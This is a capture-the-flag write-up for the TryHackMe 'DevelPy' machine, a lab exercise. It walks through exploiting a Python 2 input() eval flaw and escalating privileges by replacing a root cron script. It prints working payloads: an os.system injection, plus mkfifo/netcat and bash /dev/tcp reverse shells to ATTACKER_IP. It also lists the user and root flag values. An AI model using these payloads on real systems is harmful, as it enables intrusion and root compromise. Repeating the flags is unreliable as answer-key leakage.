# DevelPy — TryHackMe CTF Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Boot2Root  
> **Origin:** FIT & BSides Guatemala CTF  
> **Tags:** Python 2, RCE, Cron Privilege Escalation, Linux Permissions  

---

## Overview

DevelPy is a boot2root machine originally created for FIT and BSides Guatemala CTF competitions. The box features a Python 2 application running on a non-standard port that is vulnerable to Remote Code Execution via the dangerous `input()` function. Privilege escalation is achieved by abusing a cron job that executes a script located in the user's home directory.

**Attack Chain:**  
Reconnaissance → Python 2 `input()` RCE → Reverse Shell as `king` → Cron job abuse via file replacement → Root Shell

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 -p- TARGET_IP -oN scan.txt
```

**Results:**

| Port    | State | Service | Version                                      |
|---------|-------|---------|----------------------------------------------|
| 22/tcp  | open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8              |
| 10000/tcp | open | unknown | Custom Python application (`exploit.py`)    |

### Key Observations from Nmap

The nmap fingerprint for port 10000 revealed critical information:

```
Private 0days

Please enther number of exploits to send??:
```

When nmap sent HTTP probes, the service returned Python tracebacks:

```python
File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
NameError: name 'GET' is not defined
```

**Analysis:**

- A custom Python script (`exploit.py`) is listening on port 10000 via TCP
- The script uses `input()` — and the `NameError: name 'GET' is not defined` error confirms this is **Python 2**
- When nmap sent `GET / HTTP/1.0`, Python tried to **evaluate** the word `GET` as a variable name — proof that `input()` is acting as `eval(raw_input())`
- The `print ''` syntax (without parentheses) in the source further confirms Python 2

### Why This Matters: Python 2 `input()` vs Python 3 `input()`

| Python Version | `input()` Behavior | Security Impact |
|---|---|---|
| Python 2 | `eval(raw_input())` — **executes** user input as Python code | **Critical RCE** |
| Python 3 | Reads input as a plain string | Safe |

This is not a web server — it's a raw TCP socket. Therefore, tools like `curl` or `gobuster` won't work here. We need `netcat` for a direct TCP connection.

---

## Initial Access — Remote Code Execution

### Step 1: Connect and Test Code Execution

```bash
nc TARGET_IP 10000
```

At the prompt, we inject Python code instead of a number:

```python
__import__('os').system('id')
```

**Payload Breakdown:**

| Component | Purpose |
|---|---|
| `__import__('os')` | Imports the `os` module inline (we can't use multi-line `import os` in a single `input()` call) |
| `.system('id')` | Executes the `id` shell command on the server |

**Result:**

```
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

We have **Remote Code Execution** as user `king`.

**Notable groups:**
- `adm` — can read system logs in `/var/log/`
- `sambashare` — Samba is configured on the system

### Step 2: Reverse Shell

**On the attacker machine** (start a listener):

```bash
nc -lvnp 4444
```

**On the target** (connect to port 10000 and send the payload):

```bash
nc TARGET_IP 10000
```

```python
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f')
```

**Reverse shell payload breakdown:**

| Command | Purpose |
|---|---|
| `mkfifo /tmp/f` | Creates a named pipe for bidirectional communication |
| `cat /tmp/f \| /bin/sh -i` | Feeds pipe contents into an interactive shell |
| `2>&1` | Redirects stderr to stdout (so we see error messages) |
| `\| nc ATTACKER_IP 4444` | Sends shell output to our listener |
| `>/tmp/f` | Writes our input back into the pipe |

### Step 3: Stabilize the Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

```bash
cat /home/king/user.txt
```

```
cf85ff769cfaaa721758949bf870b019
```

---

## Privilege Escalation

### Enumeration

**SUID binaries** — all standard, no vector:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Sudo** — requires password (which we don't have):

```bash
sudo -l
# [sudo] password for king: 
```

**Crontab** — this is where the gold is:

```bash
cat /etc/crontab
```

```
*  *  * * *  king  cd /home/king/ && bash run.sh
*  *  * * *  root  cd /home/king/ && bash root.sh
*  *  * * *  root  cd /root/company && bash run.sh
```

**Every minute**, root runs `bash root.sh` from `/home/king/`.

### Analyzing the Scripts

```bash
cat /home/king/root.sh
```

```bash
python /root/company/media/*.py
```

```bash
cat /home/king/run.sh
```

```bash
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
```

- `run.sh` — manages the exploit.py service on port 10000 (socat wraps the script into a TCP socket)
- `root.sh` — executes all Python files in `/root/company/media/` as root

### The File Permissions Trick

Let's check permissions:

```bash
ls -la /home/king/root.sh
# -rw-r--r-- 1 root root 32 Aug 25  2019 /home/king/root.sh
```

`root.sh` is **owned by root** and we **cannot write** to it:

```bash
echo test >> /home/king/root.sh
# bash: /home/king/root.sh: Permission denied
```

However, the `/home/king/` **directory** is owned by `king`:

```bash
ls -la /home/
# drwxr-xr-x 4 king king 4096 Aug 27  2019 king
```

### The Key Insight: Directory Permissions vs File Permissions

In Linux, the ability to **delete or rename** a file is controlled by the **directory permissions**, not the file permissions. Since `king` owns the `/home/king/` directory, `king` can move or delete any file inside it — even files owned by root.

### Exploitation

**Step 1:** Move the original `root.sh` out of the way:

```bash
mv /home/king/root.sh /home/king/root.sh.bak
```

**Step 2:** Start a listener on the attacker machine:

```bash
nc -lvnp 5555
```

**Step 3:** Create a malicious `root.sh`:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' > /home/king/root.sh
```

**Step 4:** Wait up to 60 seconds for the cron job to execute.

### Root Flag

```bash
whoami
# root
cat /root/root.txt
```

```
9c37646777a53910a347f387dce025ec
```

---

## Additional Notes

### The `credentials.png` Rabbit Hole

The home directory contained a `credentials.png` file (272KB) with metadata referencing the artist "Mondrian." The image displayed colored squares on a white background in the style of Piet Mondrian's paintings.

Analysis performed:
- `steghide` — does not support PNG format
- `zbarimg` — no QR code detected
- `zsteg` / `pyzbar` — no hidden data found
- `strings` / `exiftool` — only revealed "Mondrian" as artist metadata
- Pixel index analysis — repeating patterns found but no meaningful decoded text

The password "Mondrian" and other variants did not work for `sudo`. This file appears to be a deliberate **rabbit hole** — a common CTF technique to waste time.

### The `exploit.py` Source Code

```python
#!/usr/bin/python
import time, random
print ''
print '        Private 0days'
print ''
num_exploits = int(input(' Please enther number of exploits to send??: '))
print ''
print 'Exploit started, attacking target (tryhackme.com)...'
for i in range(num_exploits):
    time.sleep(1)
    print 'Exploiting tryhackme internal network: beacons_seq={} ttl=1337 time=0.0{} ms'.format(
        i+1, int(random.random() * 100))
```

The `#!/usr/bin/python` shebang and `print ''` syntax confirm Python 2. The vulnerability is on line 6 where `input()` evaluates arbitrary user input.

### User Description in `/etc/passwd`

```
king:x:1000:1000:develpy,,,:/home/king:/bin/bash
```

The GECOS field contains `develpy` — which is also the room name, hinting at the Python-based attack vector.

---

## Lessons Learned

1. **Never use `input()` in Python 2 for user input.** Always use `raw_input()`. Python 2's `input()` is essentially `eval()` on user-controlled data — an instant RCE vulnerability.

2. **Linux directory permissions override file permissions for deletion/renaming.** If you own the directory, you can move or delete files inside it regardless of who owns them. This is a frequently tested privilege escalation vector.

3. **Always check crontab for privilege escalation.** Cron jobs running as root that reference files in user-writable locations are a classic and reliable privesc path.

4. **Recognize rabbit holes early.** Not every file on the system is relevant to the attack path. The `credentials.png` was a deliberate distraction — in real engagements, time management and knowing when to pivot is critical.

5. **Raw TCP services require raw TCP tools.** When a service isn't HTTP, tools like `curl` and `gobuster` won't work. Use `netcat` for direct TCP interaction.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and service enumeration |
| netcat (nc) | TCP connection to exploit.py and reverse shell listener |
| Python | RCE payload via `__import__('os').system()` |
| socat | (On target) Wrapping exploit.py as a TCP service |

---

## Flags

| Flag | Value |
|---|---|
| user.txt | `cf85ff769cfaaa721758949bf870b019` |
| root.txt | `9c37646777a53910a347f387dce025ec` |
